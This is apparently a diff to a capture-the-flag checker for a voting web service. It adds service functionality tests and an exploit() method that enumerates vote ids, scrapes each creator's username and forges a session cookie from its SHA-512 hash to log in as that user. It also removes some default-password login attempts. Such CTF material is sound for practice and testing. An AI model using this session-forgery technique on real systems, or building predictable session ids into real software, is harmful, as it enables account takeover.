@@ -3,6 +3,8 @@ import secrets
 import random
 import string
 import urllib
+import hashlib
+import requests
 
 def generate_content(amount):
     return "".join(random.choice(string.ascii_letters + string.digits + " ") for _ in range(amount))
@@ -42,8 +44,7 @@ class VotingChecker(BaseChecker):
                                   data={"title": title, "description": description, "notes": self.flag},
                                   allow_redirects=False)
 
-        if response.status_code != 302:
-            raise BrokenServiceException("create is broken")
+        assert_equals(302, response.status_code, "create is broken")
 
         try:
             response_query = urllib.parse.parse_qs(urllib.parse.urlparse(response.headers["Location"]).query,
@@ -97,8 +98,7 @@ class VotingChecker(BaseChecker):
                                   data={"title": title, "description": self.flag, "notes": ""},
                                   allow_redirects=False)
 
-        if response.status_code != 302:
-            raise BrokenServiceException("create is broken")
+        assert_equals(302, response.status_code, "create is broken")
 
         try:
             response_query = urllib.parse.parse_qs(urllib.parse.urlparse(response.headers["Location"]).query,
@@ -152,36 +152,16 @@ class VotingChecker(BaseChecker):
             else:
                 raise BrokenServiceException("'/vote.html' created by broken")
 
-            # check 404 for unused vote id
-            response = self.http_get(route="/vote.html", params={"v": str(int(vote_id) + 1)}, allow_redirects=False)
-            assert_equals(404, response.status_code, "'/vote.html' broken")
-
         # check "/login.html" reachable
         response = self.http_get(route="/login.html", allow_redirects=False)
         assert_equals(200, response.status_code, "'/login.html' broken")
-
-        # login as parsed user with stupid passwords
-        if "parsed_user" in locals():
-            self.http_post(route="/login.html", data={"user": parsed_user, "password": ""}, allow_redirects=False)
-            assert_equals(200, response.status_code, "'/login.html' broken")
-            self.http_post(route="/login.html", data={"user": parsed_user, "password": " "}, allow_redirects=False)
-            assert_equals(200, response.status_code, "'/login.html' broken")
-            self.http_post(route="/login.html", data={"user": parsed_user, "password": "123"}, allow_redirects=False)
-            assert_equals(200, response.status_code, "'/login.html' broken")
-
-        # login with some stupid passwords
-        self.http_post(route="/login.html", data={"user": "Admin", "password": "default"}, allow_redirects=False)
-        self.http_post(route="/login.html", data={"user": "Admin", "password": "1234"}, allow_redirects=False)
-        self.http_post(route="/login.html", data={"user": "Admin", "password": "123456"}, allow_redirects=False)
-        self.http_post(route="/login.html", data={"user": "Admin", "password": ""}, allow_redirects=False)
-        self.http_post(route="/login.html", data={"user": "", "password": ""}, allow_redirects=False)
-        self.http_post(route="/login.html", data={"user": " ", "password": " "}, allow_redirects=False)
 
         # check "/register.html" reachable
         response = self.http_get(route="/register.html", allow_redirects=False)
         assert_equals(200, response.status_code, "'/register.html' broken")
 
         # register
+        # TODO generate fake user content
         user = generate_content_no_whitespace(random.randint(8, 32))
         password = secrets.token_hex(24)
 
@@ -215,12 +195,81 @@ class VotingChecker(BaseChecker):
         if "<span>Welcome, {}!</span>".format(user) in response.text:
             raise BrokenServiceException("'/index.html' broken")
 
-        # TODO create votes, vote
+        # login again
+        response = self.http_post(route="/login.html", data={"user": user, "password": password},
+                                      allow_redirects=False)
+        assert_equals(302, response.status_code, "'login' broken")
+        assert_equals("/index.html", urllib.parse.urlparse(response.headers["Location"]).path, "'/login.html' redirect broken")
+
+        # check auth'ed "/index.html"
+        response = self.http_get(route="/index.html", allow_redirects=False)
+        assert_equals(200, response.status_code, "'/index.html' broken")
+        assert_in("<span>Welcome, {}!</span>".format(user), response.text, "'/index.html' broken")
+
+        # check "/create.html" reachable
+        response = self.http_get(route="/create.html", allow_redirects=False)
+        assert_equals(200, response.status_code, "'/create.html' broken")
+
+        # create a vote
+        # TODO generate fake user content
+        title = generate_content(random.randint(5, 48))
+        description = generate_content(random.randint(6, 128))
+        notes = generate_content(random.randint(6, 48))
+
+        response = self.http_post(route="/create.html", data={"title": title, "description": description, "notes": notes},
+                                  allow_redirects=False)
+        assert_equals(302, response.status_code, "'/create.html' is broken")
+
+        vote_path = urllib.parse.urlparse(response.headers["Location"]).path
+
+        # check vote created
+        response = self.http_get(route=vote_path, allow_redirects=False)
+        assert_equals(200, response.status_code, "'/vote.html' is broken")
+        assert_in(title, response.text, "'/vote.html' don't contain title")
+        assert_in(description, response.text, "'/vote.html' don't contain description")
+        assert_in(notes, response.text, "'/vote.html' don't contain notes")
+        assert_in("<p>Vote created by: {}</p>".format(user), response.text, "'/vote.html' don't contain user created by")
+
+        # vote yes
+        response = self.http_post(route=vote_path, data={"vote": "yes"}, allow_redirects=False)
+        assert_equals(302, response.status_code, "'/vote.html' is broken")
+        assert_equals(vote_path, urllib.parse.urlparse(response.headers["Location"]).path, "'/vote.html' is broken")
 
     def exploit(self) -> None:
-        # TODO
-        pass
 
+        vote_id = 1
+        response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)
+
+        # status code turns into 404 if we reach unused vote ids
+        while (response.status_code == 200):
+            # parse user created the vote
+            user_start = response.text.find("<p>Vote created by: ")
+            user_end = response.text.find("</p>", user_start + len("<p>Vote created by: "))
+            parsed_user = response.text[user_start + len("<p>Vote created by: "):user_end]
+            self.info("Parsed user: {}".format(parsed_user))
+
+            # the exploid: 'login' as the parsed user
+            h = hashlib.sha512()
+            h.update(str.encode(parsed_user))
+            sid = h.hexdigest()
+            
+            requests.utils.add_dict_to_cookiejar(self.http_session.cookies, {"session": sid})
+
+            # request the vote as the creator to check success
+            response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)
+
+            if "<span>Welcome, {}!</span>".format(parsed_user) not in response.text:
+                # this could happen due to a fix of the vulnerability
+                # or if the creator logged out or the session expired
+                self.info("Could not exploid vote {}.".format(vote_id))
+            else:
+                self.info("Successfully exploided vote {}.".format(vote_id))
+
+            requests.utils.add_dict_to_cookiejar(self.http_session.cookies, {"session": None})
+
+            # request next possible vote
+            vote_id += 1
+            response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)
 
 app = VotingChecker.service
 
